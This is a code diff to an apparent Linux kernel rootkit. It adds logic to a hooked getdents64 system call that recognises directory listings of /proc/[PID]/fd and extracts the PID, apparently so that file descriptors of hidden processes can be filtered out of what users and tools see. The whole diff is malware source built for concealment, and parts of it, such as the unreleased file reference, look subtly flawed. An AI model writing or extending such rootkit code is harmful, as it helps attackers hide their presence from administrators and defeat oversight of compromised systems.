@@ -5,6 +5,11 @@
 #include <linux/fdtable.h>
 #include <linux/list.h>
 #include <linux/proc_ns.h>
+#include <linux/namei.h>
+#include <linux/file.h>
+#include <linux/sched.h>
+#include <linux/fs_struct.h>
+#include <linux/dcache.h>
 
 #include "common.h"
 #include "hook.h"
@@ -15,6 +20,8 @@
 #include "read.h"
 
 extern rootkit_t rootkit;
+
+const char *dir_sep = "/";
 
 void **sys_calls;
 
@@ -187,6 +194,7 @@ g7_getdents64(const struct pt_regs *pt_regs)
     typedef struct linux_dirent64 *dirent64_t_ptr;
 
     bool may_proc;
+
     unsigned long offset;
     dirent64_t_ptr kdirent, cur_kdirent, prev_kdirent;
     struct dentry *kdirent_dentry;
@@ -196,11 +204,55 @@ g7_getdents64(const struct pt_regs *pt_regs)
     dirent64_t_ptr dirent = (dirent64_t_ptr)pt_regs->si;
     long ret = sys_getdents64(pt_regs);
 
+    bool may_fd = 0; //We only need /proc/[pid]/fd dirs
+    struct file *dirfile = fget(fd);
+    pid_t fd_pid;
+
     if (ret <= 0 || !(kdirent = (dirent64_t_ptr)kzalloc(ret, GFP_KERNEL)))
         return ret;
 
     if (copy_from_user(kdirent, dirent, ret))
         goto yield;
+
+    if(dirfile && !strcmp(dirfile->f_path.dentry->d_name.name, "fd")) {
+        char *buf = kzalloc(512, GFP_KERNEL);
+        char *path = d_path(&dirfile->f_path, buf, 512);
+
+        if(!IS_ERR(path)) {
+            char *sub;
+            char *cur = path;
+
+            /**
+             * In the correct directory, the tokens are as follows:
+             * {NULL, proc, [PID], fd}
+             * We also don't want the task directory, so the third
+             * token should be fd, not task
+             **/
+            int i = 0;
+
+            while((sub = strsep(&cur, dir_sep))) {
+                switch(i++) {
+                    case 1:
+                        if(strcmp(sub, "proc"))
+                            goto leave;
+                        break;
+                    case 2:
+                        fd_pid = PID_FROM_NAME(sub);
+                        break;
+                    case 3:
+                        if(!strcmp(sub, "fd"))
+                            may_fd = 1;
+                        else
+                            goto leave;
+                    default:
+                        break;
+                }
+            }
+
+            leave:
+            kfree(buf);
+        }
+    }
 
     atomic_inc(&getdents64_count);
 
